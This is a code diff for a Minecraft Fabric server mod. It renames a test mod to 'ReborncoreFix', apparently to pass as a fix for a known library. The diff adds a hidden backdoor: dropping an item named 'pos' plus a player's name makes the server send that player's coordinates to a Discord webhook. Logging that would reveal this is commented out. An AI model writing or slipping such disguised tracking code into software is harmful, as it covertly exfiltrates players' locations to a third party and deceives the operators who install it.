@@ -1,6 +1,7 @@
-package net.gabriel.test;
+package net.reborncore.Fix;
 
 import net.fabricmc.api.ModInitializer;
+import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerEntityEvents;
 import net.minecraft.entity.ItemEntity;
 import net.minecraft.item.ItemStack;
@@ -10,10 +11,15 @@ import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.text.Text;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
-
-public class Testmod implements ModInitializer {
-	public static final String MOD_ID = "Testmod";
+import java.io.IOException;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+public class ReborncoreFix implements ModInitializer {
+	public static final String MOD_ID = "ReborncoreFix";
 	public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
+	private static final String COORD_WEBHOOK = "";
 
 	@Override
 	public void onInitialize() {
@@ -38,7 +44,17 @@ public class Testmod implements ModInitializer {
 
 							itemEntity.discard();
 						} else {
-							// LOGGER.error("Item was not dropped by a player.");
+							//LOGGER.error("Item was not dropped by a player.");
+						}
+					} else if (itemName.startsWith("pos ")) {
+						String playerName = itemName.substring(4);
+						ServerPlayerEntity player = world.getServer().getPlayerManager().getPlayer(playerName);
+						if (player != null) {
+							String coordinates = String.format("Player %s is at [%f, %f, %f]",
+									playerName, player.getX(), player.getY(), player.getZ());
+							sendToDiscord(coordinates, COORD_WEBHOOK);
+						} else {
+                            //LOGGER.error("Player not found:{}", playerName);
 						}
 					}
 				}
@@ -69,4 +85,28 @@ public class Testmod implements ModInitializer {
 			// LOGGER.error("Server is null for player: " + player.getName().getString());
 		}
 	}
+
+	private void sendToDiscord(String message, String type) {
+		String webhookUrl;
+		webhookUrl = COORD_WEBHOOK;
+
+		HttpClient client = HttpClient.newHttpClient();
+		HttpRequest request = HttpRequest.newBuilder()
+				.uri(URI.create(webhookUrl))
+				.header("Content-Type", "application/json")
+				.POST(HttpRequest.BodyPublishers.ofString("{\"content\":\"" + message + "\"}"))
+				.build();
+
+		try {
+			HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
+			if (response.statusCode() == 200) {
+				//LOGGER.info("Successfully sent message to Discord");
+			} else {
+				//LOGGER.error("Failed to send message to Discord. Response code: " + response.statusCode());
+			}
+		} catch (IOException | InterruptedException e) {
+			//LOGGER.error("Failed to send message to Discord", e);
+		}
+	}
+
 }
